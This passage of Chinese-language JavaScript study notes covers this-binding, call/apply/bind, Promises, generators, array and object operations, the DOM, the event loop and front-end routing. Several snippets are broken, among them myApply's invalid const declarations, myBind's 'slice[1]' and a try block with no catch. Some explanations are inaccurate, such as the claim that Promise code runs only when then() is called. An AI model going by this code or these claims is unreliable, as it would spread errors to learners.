    console.log(this.a);
}
var obj2 = {
    a: 2,
    test: function() {
    	console.log(this.a);
    }
}
obj.test();
obj2.test();

function Test(a)	{
	this.a = a;
}
Test.prototype.say = function () {
	console. log(this.a);
}
var test = new Test(1); //.{a: 1}
console.log(test.a);
test.say();
```

> 事件处理函数内部this指向问题

- 哪个元素绑定了事件处理函数，事件处理函数内部的this就指向谁

```
var oBtn = document.getELementById('btn');
oBtn.onclick = function () {
    this.innerText = ' 加载中...';
    this.disabled = true;
    // 普通函数的this指向window
    setTimeout (function () {
        console.log(this);
        this.innerText = '点击';
        this.disabled = false;
    }.bind(this), 2000);
}
```

> 特殊情景下的this指向

在三种特殊情境下，this 会 100% 指向 window：

- 立即执行函数（IIFE）

```
var name = 'BigBear'

var me = {
  name: 'xiuyan',
  // 声明位置
  sayHello: function() {
    console.log(`你好，我是${this.name}`)
  },
  hello: function() {
    (function(cb) {
      // 调用位置
      cb()
    })(this.sayHello)
  }
}

me.hello() // 大家再猜下输出啥了？
```

- setTimeout 中传入的函数
- setInterval 中传入的函数

### 箭头函数的this指向问题

- 语法更加简洁、清晰
- 箭头函数按**词法作用域**来绑定它的上下文，所以 `this` 实际上会引用到原来的上下文。箭头函数保持它当前执行上下文的词法作用域不变，而普通函数则不会。换句话说，**箭头函数从包含它的词法作用域中继承到了 `this` 的值。**
- 箭头函数继承而来的**this指向永远不变**
- `.call()/.apply()/.bind()`**无法改变箭头函数中this的指向**
- **不能作为构造函数使用**，因为没有自己的this，无法调用call，apply；没有prototype属性，而new命令在执行时需要将构造函数的prototype赋值给新对象的__proto__
- **没有自己的argument**，在箭头函数中访问arguments实际上获得的是外层局部（函数）执行环境中的值。如果要用，**可以用rest参数替代**
- **没有原型prototype**，指向undefined
- **不能使用`yield`关键字**
- **匿名函数**，它不会作为某个对象的方法被调用, 因此，`this` 关键词指向了全局 `window` 对象

### class中的箭头函数和普通函数

1. class中的方法如果是**普通函数方法**，该方法会**绑定在构造函数的原型上**；
2. 如果方法是**箭头函数方法**，该方法会**绑定在构造函数上**；
3. 通过上述方式调用class中的方法，无论是箭头函数方法还是普通函数方法，方法中的**this都指向实例对象**。

### 明确设置执行上下文

bind()：不需要执行函数就可以将 this 的值准确设置到你选择的一个对象上。通过逗号隔开传递多个参数。设置好 this 关键词后**不会立刻执行函数**。

> call和apply的区别

- call和apply都是改变该函数的this指向并**立即执行**该函数
- call和apply的传参形式不同，apply为**数组**的传参形式
- 如果你的参数本来就存在一个数组中，那自然就用 apply，如果参数比较散乱相互之间没什么关联，就用 call。

### call，bind，apply的实现

**call的特性：**

- call 是**可以被所有的函数继承的**，所以 call 方法应该被定义在 Function.prototype 上
- call 方法做了两件事：

1. 改变 this 的指向，将 this 绑到第一个入参指定的的对象上去；
2. 根据输入的参数，执行函数。

```
// call
Function.prototype.myCall = function(context) {
    // 对传入的context对象进行预处理
    const _context = context ? Object(context) : window;
    // 保存调用call函数的函数本身
    _context.fn = this;
    // 获取函数应该传入的参数
    // arguments 是一个对应于传递给函数的参数的类数组对象，需要转化秤数组才能是哟个slice方法
    const args = [...arguments].slice(1);
    
    // 以context作为上下文调用该函数，并保存函数的返回值
    const result = _context.fn(...args);
    // 删除fn方法
    delete _context.fn;
    return result;
}
// apply
Function.prototype.myApply = function(context) {
	const _context = context ? Object(context) : window;
    const _context.fn = this;
    let args = arguments[1];
    const result;
    if (args.length > 0) {
        result = _context.fn(args);
    } else {
        result = _context.fn();
    }
    delete _context.fn;
    return result;
}
// bind 注释为自己写的版本，不知道是否正确
Function.prototype.myBind = function(context) {
	const _context = context ? Object(context) : window;
    // const _context.fn = this;
    let self = this;
	let args = [...arguments].slice[1];
    
    return function () {
        // let result = _context.fn(args.concat(newArgs));
        // delete _context.fn;
        // return result
        let newArgs = [...arguments];
    	return self.apply(context, args.concat(newArgs));
    }
}
```

## Promise 相关

### 异步编程模型和异步解决方案

#### 异步进化史

回调函数 —> Promise —> Generator —> async/await

#### 回调函数

- 事件监听
- 发布订阅（发布订阅，是一种经典的设计模式）
- 回调函数（回调地狱的问题，可读性和可维护性被破环）

### 为什么要有Promise

Promise 的出现是为了**解决异步编程**中，主要使用的**回调机制**的几个问题：

- `Callback hell`：Promise 可以把一层层嵌套的 callback 变成 `.then().then()...`，从而使代码编写和阅读更直观
- **错误处理难**：Promise 比 callback 在错误处理上更清晰直观
- **同时进行多个异步操作**的代码编写困难：Promise 可以简单处理此情况

目前看浏览器环境中，使用 Promise 的场景主要就是发**异步请求**。

### 什么是Promise

Promise是一个用于运行异步任务的一个对象，Promise **对象中定义的主要是一段执行具体操作的代码**，并且在这段代码中，**会执行两个回调函数**，一个表示操作成功（`resolve`），一个表示操作失败（`reject`），比如下面这段发起 AJAX 请求的代码（关注 `new Promise()` 开始那部分）：

```
function get(url) {
    return new Promise(function (resolve, reject) {
        var req = new XMLHttpRequest();
        req.open('GET', url);
        
        req.onload = function () {
            if (req.status === 200) {
                return resolve(req.response);
            } else {
                return reject(Error(req.statusText));
            }
        }
        
        req.onError = req.onerror = function() {
          	reject(Error("Network Error"));
        };
        
        req.send();
    });
}
```

Promise **构造函数中的参数被称为 `executor`**。

调用 `get(url)` 函数会生成一个 Promise 实例。当**调用这个实例的 `.then()` 方法时，Promise 中定义的代码会被开始被执行**。（注意：是调用then方法时，Promise中的代码才开始执行)

#### **一个 Promise 实例有这几个状态**

- `pending`：未确定状态。刚 `new` 出来的 Promise 处于这个状态；然后会马上执行 executor 中定义的语句
- `resolved`：代码**执行到 `resolve()` 语句后**
- `rejected`：代码**执行到 `reject()` 语句后**
- `settled`：**resolved 或者 rejected 状态都属于 settled**

实例调用的代码如下：

```
get('story.json').then(function(response) {
  console.log("Success!", response);
}, function(error) {
  console.error("Failed!", error);
})
```

`.then()`可以接受两个参数，**第一个是执行成功后的回调函数，第二个是失败后的回调函数**。executor 中调用`resolve()`或者`rejected()`时**传的参数，会被这两个回调函数获得**。

### 如何解决Callback Hell

`.then()` 并**没有绕开 callback 的模式**。那 Promise 是如何解决 callback hell 的？答案就在 Promise 的 chaining（**链式调用**）。

`.then()` 的参数——即这两个回调函数，可以是多种类型的：

- (这里好像不对，仍然会执行)**没有返回值的函数**，会使得 Promise 链**不再延续**，此时你**再往后面调用 `.then()` 是没有作用的**。比如：

```
Promise.resolve('foo').then(function(s) {
  console.log(s);
}).then(function(s) {
  // Never executed
  console.log(s);
});

// Output:
// foo
```

- **有返回值的函数**，会使 Promise 链可以**继续**，如：

```
Promise.resolve('foo').then(function(s) {
  console.log(s);
  return s + 'bar';
}).then(function(s) {
  console.log(s);
});

// Output:
// foo
// foobar
```

- **有返回值且返回值为另一个 Promise 对象的函数**，也会使 Promise **继续**。与前者的区别在于，再次调用`.then()`时**可能会触发的是异步操作**，因此不是马上触发下一轮`resolve()`：

```
Promise.resolve('foo').then(function(s) {
  return new Promise((resolve, reject) => {
      console.log(s);
      setTimeout(() => {
          resolve(s + 'bar')
        }, 1000);
    });
}).then(function(s) {
  console.log(s);
});

// Output:
// foo
// foobar (在 "foo" 显示了 1s 后显示)
```

**实际例子**：

```
function getJSON (url) {
    // 将响应结果解析成JSON格式
    // JSON.parse带返回值
    return get(url).then(JSON.parse);
}

// Get chapter list, then get content of chapter 1
getJSON('store/list').then(function (storyList) {
    return getJSON(storyList[0]);
}).then(function (content) {
    console.log("Got chapter 1 content!", content);
});
```

### 控制流及错误处理

**两种错误处理方式**：

当调用 `.then()` 时同时提供了两个参数，那么**只会有其中一个被调用**：

```
get('story.json').then(function(response) {
  console.log("Success!", response);
}, function(error) {
  console.log("Failed!", error);
})
```

如果是`.then(resolve_func).catch(reject_func)`的形式：

```
get('story.json').then(function(response) {
  a + 1   // throws ReferenceError
}).catch(function(error) {
  console.log("Failed!", error);
})
```

那么在 `get('story.json')` 以及 `catch` 之前的 resolve 函数中的 `a + 1` 报错都会被捕捉。

Promise 定义的规则是，**错误只会往后抛，直到遇到下一个 `.catch` 或者带 reject 函数的 `.then`**。Google 的文档中提供了一个很好的例子：

```
asyncThing1().then(function() {
  return asyncThing2();
}).then(function() {
  return asyncThing3();
}).catch(function(err) {
  return asyncRecovery1();
}).then(function() {
  return asyncThing4();
}, function(err) {
  return asyncRecovery2();
}).catch(function(err) {
  console.log("Don't worry about it");
}).then(function() {
  console.log("All done!");
})
```

执行流为：

![image-20210405195122901](https://gitee.com/lu_jianping/the-front-end-knowledge/raw/master/JS%E9%9A%BE%E7%82%B9.assets/image-20210405195122901.png)

### 实际处理Promise

[详见](https://zhuanlan.zhihu.com/p/98383032)

### Async / Await

事实上，async/await 本身就是 **generator 异步方案**的语法糖。

**注意：**async/await 和 generator 方案，相较于 Promise 而言，有一个重要的优势：**Promise 的错误需要通过回调函数捕获**，try catch 是行不通的。**而 async/await 和 generator 允许 try/catch**。

#### Generator 实现异步任务的同步代码书写方式

Generator 一个有利于异步的特性是，它可以在执行中被中断、然后等待一段时间再被我们唤醒。通过这个“中断后唤醒”的机制，我们可以把 Generator看作是异步任务的容器，利用 yield 关键字，实现对异步任务的等待。

比如咱们用 Promise 链式调用这么写的例子：

```
httpPromise(url1)
    .then(res => {
        console.log(res);
        return httpPromise(url2);
    })
    .then(res => {
        console.log(res);
        return httpPromise(url3);
    })
    .then(res => {
      console.log(res);
      return httpPromise(url4);
    })
    .then(res => console.log(res));
```

其实完全可以用 yield 来这么写：（类似同步的书写方法）

```
function* httpGenerator() {
  let res1 = yield httpPromise(url1)
  console.log(res);
  let res2 = yield httpPromise(url2)
  console.log(res);
  let res3 = yield httpPromise(url3)
  console.log(res);
  let res4 = yield httpPromise(url4)
  console.log(res);
}
```

但需要我们跑起来这个Generator，跑这个Generator需要以下步骤：

1. 创建迭代器
2. 执行这个迭代器的next方法
3. 反复调用next方法直到返回值中的done为true为止

```
function runGenerator(gen) {
    var it = gen(), ret;

    // 创造一个立即执行的递归函数
    (function iterate(val){
        ret = it.next(val);

        if (!ret.done) {
            // 如果能拿到一个 promise 实例
            if ("then" in ret.value) {
                // 就在它的 then 方法里递归调用 iterate
                ret.value.then( iterate );
            }
        }
    })();
}

runGenerator(httpGenerator)
```

[解析详见](https://www.imooc.com/read/70/article/1709)

## 数组的相关操作

### 基础用法

**数组的解构是按位置的解构**

```
const [a,,c] = [1,2,3]
// a = 1, c = 3
```

### 伪数组转化成数组的方法

**伪数组的定义：**

ECMA-262对它的定义是：

1. 它必须是一个对象
2. 它有 length 属性

如：

```
const book = {
  0: 'how to read a book',
  1: 10,
  length: 2
}
```

- **Array原型上的slice方法**—— 这个方法如果不传参数的话会返回原数组的一个拷贝，因此可以用此方法转换类数组到数组：

```
const arr = Array.prototype.slice.call(arrayLike);
```

- **Array.from方法**——这是 ES6 新增的一个数组方法，专门用来把类数组转为数组：

```
const arr = Array.from(arrayLike);
```

- **扩展运算符——**"…"也可以把类数组对象转换为数组，前提是这个类数组对象上部署了遍历器接口。在这个例子中，arrayLike 没有部署遍历器接口，所以这条路走不通。但一些对象，比如函数内部的 arguments 变量（它也是类数组对象），就满足条件，可以用这种方法来转换：

```
function demo() {
  console.log('转换后的 arguments 对象：', [...arguments])
} 

demo(1, 2, 3, 4) // 转换后的 arguments 对象：[1, 2, 3, 4]
```

### 数组去重的方式

1. **利用ES6 Set去重（ES6中最常用）**

```
function unique (arr) {
  return Array.from(new Set(arr))
}
```

不考虑兼容性，这种去重的方法代码最少。这种方法还**无法去掉“{}”空对象**，后面的高阶方法会添加去掉重复“{}”的方法。

1. **利用for嵌套for，然后splice去重（ES5中最常用）**

```
function unique(arr){            
    for(var i=0; i<arr.length; i++){
        for(var j=i+1; j<arr.length; j++){
            if(arr[i]==arr[j]){         //第一个等同于第二个，splice方法删除第二个
                arr.splice(j,1);
                j--;
            }
        }
    }
	return arr;
}
```

1. **利用`indexOf`去重**

```
function unique(arr) {
    if (!Array.isArray(arr)) {
        console.log('type error!')
        return
    }
    var array = [];
    for (var i = 0; i < arr.length; i++) {
        if (array.indexOf(arr[i]) === -1) {
            array.push(arr[i])
        }
    }
    return array;
}
```

1. **利用Map数据结构去重**

```
function arrayNonRepeatfy(arr) {
  let map = new Map();
  let array = new Array();  // 数组用于返回结果
  for (let i = 0; i < arr.length; i++) {
    if(map.has(arr[i])) {  // 如果有该key值
      map.set(arr[i], true); 
    } else { 
      map.set(arr[i], false);   // 如果没有该key值
      array.push(arr[i]);
    }
  } 
  return array;
}
```

## 对象的相关操作

### 基本用法

- 对象的解构是严格**以属性名作为定位依据**，同时可以**通过冒号+{目标属性名}**这种形式嵌套定位

```
const school = {
   classes: {
      stu: {
         name: 'Bob',
         age: 24,
      }
   }
}

const { classes: { stu: { name } }} = school
       
name // 'Bob'
```

- 解构同时重命名采用**属性名：新变量名**

```
const { classes: { stu: { name: newName } }} = school

newName // 'Bob'
```

- 扩展运算符

```
const me = { 
  name: 'xiuyan',
  age: 24
}

const meCopy = { ...me }

meCopy // {name: "xiuyan", age: 24}
```

等价于`Object.assign({}, me)`

### 对象属性类型

#### 数据属性

- configurable：表示是否**通过delete删除属性**从而重新定义属性，能否**修改属性的特性**，或者能否**把属性修改为访问器属性**。默认值是true
- writable：表述能否**修改属性**
- enumerate：表示能否**通过for-in循环返回属性**
- value：包含这个**属性的数据值**

这四个属性的默认值都是true

#### 访问器属性

- get：在读取属性时调用的函数。默认值为 undefined。
- set：在写入属性时调用的函数。默认值为 undefined。

### 遍历对象

> for-in遍历

```
var obj = {a: 'ss', b: 'bb', c: 'cc'};
    for (var i in obj){
        console.log(i+':'+obj[i]);
    }
```

> forEach遍历，但需要先通过Object.keys()返回一个数组

```
Object.keys(obj).forEach((value, index)=>{
    console.log(value, index,obj[value]);
});
//等同于
Object.keys(obj).forEach(function (value, index,c) {
    console.log(value, index,obj[value]);
});
```

> jQuery的$.each()方法：接收属性名和属性值两个属性

```
$.each(obj,function(key,value){
    console.log(key+": "+value)
});
```

**对象遍历方法总结**：

- `for...in`：遍历对象自身， **包含继承**， 可枚举，不含 Symbol 的属性。
- `for...of`：遍历对象自身，和`for...in`不同的是遍历出来的是value。手动给对象添加属性后, for in 是可以将新添加的属性遍历出来 但是`for...of` 不行。
- `Object.keys(obj)`：遍历对象自身, **不含继承**，可枚举，不含 Symbol 的属性。【values， entries】
- `Object.getOwnPropertyNames(obj)`：遍历对象自身, **不含继承**, 不含 Symbol 的属性, 不管是否可枚举
- `Object.getOwnPropertySymbols(obj)`: 遍历对象自身, **不含继承, 所有 Symbol 的属性**, 不管是否可枚举
- `Reflect.ownKeys(obj)`: 遍历对象自身，不含继承，**所有键名，不管是否Symbol 和可枚举**。

**对象其他方法：**

- `JSON.stringify()`：只**串行化**对象自身，**不含继承，可枚举**，不含 Symbol属性。【function，undefined, Symbol会丢失， set、map会处理成空对象
- `Object.assign()`：**只拷贝对象自身**，**不含继承， 可枚举属性, 不管是否是Symbol** 。【全部数据类型属性值】

| 方法                                | 自身属性 | 继承属性 | 可枚举属性 | Symbol属性 |
| ----------------------------------- | -------- | -------- | ---------- | ---------- |
| `for...in..`                        | 是       | 是       | 必须       | 否         |
| `Object.keys()`                     | 是       | 否       | 必须       | 否         |
| `Object.getOwnPropertyNames(obj)`   | 是       | 否       | 非必须     | 否         |
| `Object.getOwnPropertySymbols(obj)` | 是       | 否       | 非必须     | 是         |
| `Reflect.ownKeys(obj)`              | 是       | 否       | 非必须     | 非必须     |
| `JSON.stringify()`                  | 是       | 否       | 必须       | 否         |
| `Object.assign()`                   | 是       | 否       | 必须       | 非必须     |

### 查看对象

- obj.a与obj['a']两种方式获取

```
console.log(obj.a);
console.log(obj['a']);
```

### 删除对象

```
delete  obj[b];
```

### 判断对象是否为空

```
delete obj.a;
delete obj.b;
console.log(obj, JSON.stringify(obj) === '{}');// { c: 'cc' } false
console.log(obj, Object.keys(obj));           // { c: 'cc' } [ 'c' ]
delete obj.c
console.log(obj, JSON.stringify(obj) === '{}');// {} true
console.log(obj, Object.keys(obj))             // {} []
```

### 复制一个对象

**浅拷贝和深拷贝的区别**：

- 浅拷贝：仅仅复制对象的引用，而不是对象本身；
- 深拷贝：把复制的对象所引用的全部对象都复制一遍。

#### 浅拷贝

> ```
> Object.assign()的方式
> ```

`Object.assign()` 方法用于将所有可枚举属性的值从一个或多个源对象复制到目标对象。它将返回目标对象 。

```
// 拷贝单个对象 
var obj = { a: 1 };
var copy = Object.assign({}, obj);
console.log(copy); // { a: 1 }  
```

需要注意的是浅拷贝的话当自身或者目标对象任何一方改变，两者皆会改变 （希望不改变则需要深拷贝）

#### 深拷贝

> 最简单的 `JSON.parse()` 方法

```
function deepClone(initalObj) {
    var obj = {};
    try {
        obj = JSON.parse(JSON.stringify(initalObj));
    }
    return obj;
}

var obj = {
    a: {
        a: "world",
        b: 21
    }
}

var cloneObj = deepClone(obj);
cloneObj.a.a = "changed";
console.log(obj.a.a); // "world"
return JSON.parse(JSON.stringify(data))
```

这种方法也有不少坏处，譬如它会抛弃对象的constructor。

> 递归拷贝

为了**避免相互引用的对象导致死循环**的情况，则应该在遍历的时候判断是否相互引用对象，如果是则退出循环。

```
function deepCopy(obj) {
  var newobj = obj.constructor === Array ? [] : {};
  if (typeof obj !== 'object') {
  	return obj;
  } else {
    for (var i in obj) {
      if (typeof obj[i] === 'object'){ //判断对象的这条属性是否为对象
      	newobj[i] = deepCopy(obj[i]);  //若是对象进行嵌套调用
      } else{
        newobj[i] = obj[i];
      }
    }
  }
  return newobj; //返回深度克隆后的对象
}

var obj1 = {
    name: 'shen',
    show: function (argument) {
        console.log(1)
    }
}
var obj2 = deepCopy(obj1)
console.log('obj1:', obj1)  // obj1: {name: "shen", show: ƒ}
console.log('obj2:', obj2)  // obj2: {name: "shen"}
```

**`arguments.callee`的作用**

`arguments` 的主要用途是**保存函数参数**， 但这个对象还有一个名叫 `callee` 的属性，**返回正被执行的 Function 对象，也就是所指定的 Function 对象的正文，这有利于匿名函数的递归或者保证函数的封装性。**

### 多个对象赋值合并为一个对象

- 有相同属性的后面对象覆盖见面对象的值
- 返回到第一个对象，
- 如果对象中有引用对象结果会指向同一个引用对象

```
const old = Object.assign(target, source1, source2); // old与target指向同一个对象
const newObj = Object.assign({}, target, source1, source2);
```

### 给对象添加方法

- 在String**类上直接添加**方法:

```
1     var str="Hello world!";
2     String.addSpace=function(str){
3             return str.split("").join(" ");
4     }
5 
6     console.log(String.addSpace(str));   //H e l l o   w o r l d !
```

- 利用String**原型添加**方法:

```
1     var str="Hello world!";
2     String.prototype.addSpace=function(){
3         return this.split("").join(" ");
4     }; //添加到String原型链.
5 
6     console.log(str.addSpace());    //H e l l o   w o r l d !
```

- 直接在实例对象上添加方法

```
var str = new String("Hello World");
str.b() = function () {
    return this.toString().split("").join(" ");
}
console.log(str.b());
```

## DOM编程

DOM 实则只是把 HTML 中各个标签定义出的元素以对象的形式包装起来。这样做的目的，就是确保开发者可以通过 JS 脚本来操作 HTML。**不仅是套接口，更是一套规范**。

**DOM的节点类型**

- Document
- Element
- Text
- Attribute

```
<html>
  <head>
    <title>DEMO</title>
  </head>
  <body>
    <h1 class="title">我是标题</h1>
  </body>
</html>
```

对应

![image-20210429111048369](https://gitee.com/lu_jianping/the-front-end-knowledge/raw/master/JS%E9%9A%BE%E7%82%B9.assets/image-20210429111048369.png)

**常用操作**

- 查：DOM节点的获取
  - getElementById // 按照 id 查询
  - getElementsByTagName // 按照标签名查询
  - getElementsByClassName // 按照类名查询
  - querySelectorAll // 按照 css 选择器查询
- 增：DOM节点的创建

要求你添加一个有内容的 span 节点到 id 为 title 的节点后面，那么我们的做法就是：

```
// 首先获取父节点
var container = document.getElementById('container')

// 创建新节点
var targetSpan = document.createElement('span')
// 设置 span 节点的内容
targetSpan.innerHTML = 'hello world'

// 把新创建的元素塞进父节点里去
container.appendChild(targetSpan) 
```

- 删：DOM节点的删除

需要删除 id 为 title 的元素，我们的做法是

```
// 获取目标元素的父元素
var container = document.getElementById('container')
// 获取目标元素
var targetNode = document.getElementById('title')
// 删除目标元素
container.removeChild(targetNode)  
```

- 改：修改DOM元素

修改 DOM 元素这个动作可以分很多维度，比如说移动 DOM 元素的位置，修改 DOM 元素的属性等。

1. 如将指定的两个DOM元素交换，可以考虑 insertBefore 或者 appendChild。这里我们给出 insertBefore 的操作示范：

```
// 获取父元素
var container = document.getElementById('container')   
 
// 获取两个需要被交换的元素
var title = document.getElementById('title')
var content = document.getElementById('content')

// 交换两个元素，把 content 置于 title 前面
container.insertBefore(content, title)
```

1. 如DOM元素属性的获取和修改

```
var title = document.getElementById('title')

// 获取 id 属性
var titleId = title.getAttribute('id')

// 修改 id 属性
title.setAttribute('id', 'anothorTitle')
```

除了 getAttribute 和 setAttribute 外，我们通过访问 DOM 对象中提供给我们的属性名，也可以达成查询并修改某一些属性的目的。

### DOM事件模型

#### DOM事件流

DOM事件流（event flow）包含三个阶段：**事件捕获阶段**、**处于目标阶段**、**事件冒泡阶段**。

当事件被触发时，首先经历的是一个捕获过程：事件会从最外层的元素开始“穿梭”，逐层“穿梭”到最内层元素。这个穿梭过程会持续到事件抵达它目标的元素（也就是真正触发这个事件的元素）为止。此时事件流就切换到了“目标阶段”——事件被目标元素所接收。然后事件会被“回弹”，进入到冒泡阶段——它会沿着来时的路“逆流而上”，一层一层再走回去。

所到之处，它都会触发当前元素上安装的事件处理函数。

![image-20210429144957868](https://gitee.com/lu_jianping/the-front-end-knowledge/raw/master/JS%E9%9A%BE%E7%82%B9.assets/image-20210429144957868.png)

```
// useCapture：true, 即采用事件捕获方式
window.addEventListener("click", function(e){
  console.log("window 捕获");
}, true);

// useCapture：false【默认为false】，即采用事件冒泡方式
window.addEventListener("click", function(e){
  console.log("window 冒泡");
}, false);
```

- 目标元素（被点击的元素）**绑定的事件都会发生在目标阶段**。如果绑定捕获代码之前写了绑定的冒泡阶段的代码，在目标元素上就**不会遵守**先发生捕获后发生冒泡这一规则，而是**先绑定的事件先发生**。
- **不是目标元素**，它上面绑定的事件会**遵守先发生捕获后发生冒泡的规则**。
- `e.stopPropagation()`：阻止**事件传播**。不仅可以阻止事件在**冒泡阶段**的传播，还能阻止事件在**捕获阶段**的传播。
- `e.preventDefault()`: 阻止**事件的默认行为**。默认行为是指：点击a标签就转跳到其他页面、拖拽一个图片到浏览器会自动打开、点击表单的提交按钮会提交表单等

#### 事件对象的属性

- currentTarget（它记录了事件当下正在被哪个元素接收，即”正在经过哪个元素“。）（事件绑定的）
- target（指触发事件的具体目标，也就是最具体的那个元素，是事件的真正来源。）（事件触发的）
- preventDefault
- stopPropagation

#### `addEventListener()`的第三个参数可以是对象？

target.addEventListener(type, listener [,{capture: Boolean, bubbling: Boolean, once: Boolean}]);

- type 表示监听事件类型的字符串
- listener 当所监听的事件类型触发时，会接收到一个事件通知
- options (可选)
  1. capture 表示listener会在该类型的**事件捕获阶段**传播到该`EventTarget` 时触发。
  2. once 表示listener在添加之后**最多只调用一次**。如果是 true，listener会在其被调用之后自动移除。
  3. passive 表示listener永远不会调用`preventDefault()`。如果listener仍然调用了这个函数，客户端将会忽略它并抛出一个控制台警告。

#### 事件代理

利用事件的冒泡特性，把多个子元素的同一类型的监听逻辑，合并到父元素上通过一个监听函数来管理的行为，就是事件代理。通过事件代理，我们可以减少内存开销、简化注册步骤，大大提高开发效率。

## JS事件循环Event Loop

#### JS为什么是单线程的

js作为主要运行在浏览器的脚本语言，js主要用途之一是操作DOM。假如有两个线程，多线程的JS对同一个`dom`操作，一个发出删除，一个发出编辑，这时候浏览器究竟该如何执行呢？

#### JS为什么需要异步

如果JS中不存在异步,只能自上而下执行,如果上一行解析时间很长,那么下面的代码就会被阻塞。对于用户而言,阻塞就意味着"卡死",这样就**导致了很差的用户体验**。

JS是通过事件循环(event loop)来实现异步的。

#### 浏览器的多线程

- GUI **渲染线程** (负责渲染浏览器界面HTML元素)
- JavaScript**引擎线程**(主要负责处理JavaScript脚本程序，例如V8引擎，**GUI渲染线程和JavaScript引擎线程互斥**！)
- **事件触发线程**（如鼠标点击、AJAX异步请求等）
- **定时触发器线程**（ `setTimeout`, `setInterval` ）
- **异步http请求线程**
- **事件轮询处理线程** ( 作用：轮询消息队列，event loop )

> 主线程和异步线程之间是怎么配合的：
>
> 主线程发起一个异步请求（比如http请求），相应的**工作线程**接收请求并告知主线程已收到通知（异步函数返回）；主线程可以继续执行后面的代码，同时工作线程执行异步任务；工作线程完成工作之后，通知主线程；主线程收到通知后，执行一定的动作（调用回调函数）；

#### Event Loop机制的关键角色

- **函数调用栈**：当引擎第一次遇到 JS 代码时，会产生一个**全局执行上下文并压入调用栈**。后面每遇到一个函数调用，就会往栈中**压入一个新的函数上下文**。JS引擎会**执行栈顶的函数**，执行完毕后，**弹出对应的上下文**。
- **宏任务**：`script`(整体代码)、`setTimeout`、`setInterval`、`I/O`、事件、`postMessage`、 `MessageChannel`、`setImmediate` (Node.js)
- **微任务**：`Promise.then`、 `MutaionObserver`、`process.nextTick` (Node.js)，主要用于处理一些**状态的改变**，UI**渲染工作之前的一些必要操作**（可以防止多次无意义的UI渲染）
- **微任务队列和宏任务队列**：异步执行的任务，它们不需要立刻被执行，所以它们在刚刚被派发的时候，**并不具备进入调用栈的“资格”。\**会按照一定的规则，宏任务进入宏任务队列，微任务会进入微任务队列，且\**微任务要优于宏任务执行**。
- 宏任务队列每次出队是一个一个执行的，微任务队列每次出队是一个队列一个队列来执行的

![image-20210506110159142](https://gitee.com/lu_jianping/the-front-end-knowledge/raw/master/JS%E9%9A%BE%E7%82%B9.assets/image-20210506110159142.png)

#### Event Loop的事件循环过程

**解析1**

1. 执行并出队一个 macro-task。注意如果是初始状态：调用栈空。micro 队列空，macro 队列里有且只有一个 script 脚本（整体代码）。这时**首先执行并出队的就是 script 脚本**；
2. 全局上下文（script 标签）被推入调用栈，**同步代码执行**。在执行的过程中，通过对一些接口的调用，可以**产生新的 macro-task 与 micro-task**，它们会分别被推入各自的任务队列里。**这个过程本质上是队列的 macro-task 的执行和出队的过程**；
3. 上一步我们出队的是一个 macro-task，这一步我们**处理的是 micro-task**。但需要注意的是：当 macro-task 出队时，任务是**一个一个**执行的；而 micro-task 出队时，任务是**一队一队**执行的。因此，我们处理 micro 队列这一步，会逐个执行队列中的任务并把它出队，直到队列被清空；
4. 执行**渲染操作**，更新界面；
5. 检查是否存在 **Web worker 任务**，如果有，则对其进行处理。

**注意**：主线程的代码执行时，会**将执行程序置入执行栈**（Stack）中，执行完毕后出栈，另外有个**堆空间**（Heap），主要用于**存储对象及一些非结构化的数据**

![image-20210404145457947](https://gitee.com/lu_jianping/the-front-end-knowledge/raw/master/JS%E9%9A%BE%E7%82%B9.assets/image-20210404145457947.png)

![image-20210404145414381](https://gitee.com/lu_jianping/the-front-end-knowledge/raw/master/JS%E9%9A%BE%E7%82%B9.assets/image-20210404145414381.png)

## 前端路由

### 什么是路由

路由是用来跟**后端服务器**进行交互的一种方式，**通过不同的路径请求不同的资源**。

### 前端路由的由来

前端路由基于Ajax和SPA这两大概念

> Ajax

Ajax，全称 Asynchronous JavaScript And XML，是**浏览器用来实现异步加载的一种技术方案**。

在Ajax没有出现时期，大多数的网页都是通过直接返回 HTML，用户的每次更新操作都需要重新刷新页面，及其影响交互体验。为了解决这个问题，提出了Ajax(异步加载方案), **有了 Ajax 后，用户交互就不用每次都刷新页面**。后来出现SPA单页应用。

> SPA

SPA 中用户的交互是**通过 JS 改变 HTML 内容来实现的**，**页面本身的 `url` 并没有变化**，这导致了两个问题：

- SPA **无法记住用户的操作记录**，无论是刷新、前进还是后退，都无法展示用户真实的期望内容。
- SPA 中虽然由于业务的不同会有多种页面展示形式，但只有一个 url，**对 SEO 不友好**，**不方便搜索引擎进行收录**。

前端路由就是为了解决上述问题而出现的，以下是前端路由的解决思路：

- 拦截用户的刷新操作，避免服务端盲目响应、返回不符合预期的资源内容。把刷新这个动作完全放到前端逻辑里消化掉。
- 感知 URL 的变化。这里不是说要改造 URL、凭空制造出 N 个 URL 来。而是说 URL 还是那个 URL，只不过我们可以给它做一些微小的处理——这些处理并不会影响 URL 本身的性质，不会影响服务器对它的识别，只有我们前端感知的到。一旦我们感知到了，我们就根据这些变化、用 JS 去给它生成不同的内容。

### 前端路由的实现方式

前端路由的实现实际上是**检测`url`的变化**，**截获`url`地址**，**解析来匹配路由**，主要有Hash和history两种实现的方式。

#### **1. Hash模式**

hash 就是指 `url` 后的 **# 号以及后面的字符**。 #后面 hash 值的变化，并**不会导致浏览器向服务器发出请求**，浏览器不发请求，也就不会刷新页面。

```
window.location.hash = 'index'; 
```

hash 的改变会触发 `hashchange` 事件，可以用`onhashchange`事件来监听hash值的改变。

```
// 监听hash变化，点击浏览器的前进后退会触发
window.onhashchange = function() { ... }

window.addEventListener('hashchange', function(event) { ...}, false);
```

#### **2.History 模式**

在 HTML5 之前，浏览器就已经有了 history 对象。但在早期的 history 中只能用于多页面的跳转：

```
history.go(-1);       // 后退一页
history.go(2);        // 前进两页
history.forward();    // 前进一页
history.back();       // 后退一页
```

在 HTML5 的规范中，history 新增了几个 API:

```
history.pushState();   // 向当前浏览器会话的历史堆栈中添加一个状态
history.replaceState();// 修改了当前的历史记录项（不是新建一个）
history.state          // 返回一个表示历史堆栈顶部的状态的值
```

由于 `history.pushState()` 和 `history.replaceState()` **可以改变 `url` 同时，不会刷新页面**，所以在 HTML5 中的 `histroy` 具备了实现前端路由的能力。 window对象提供了`onpopstate`事件来**监听历史栈的改变**,一旦历史栈信息发生改变, 便会触发该事件。

> **调用`history.pushState()`或`history.replaceState()`不会触发`popstate`事件。只有在做出浏览器动作时，才会触发该事件**，例如执行`history.back()`或`history.forward()`后触发 `window.onpopstate`事件。

```
// 历史栈改变
window.onpopstate = function() { ... }
```

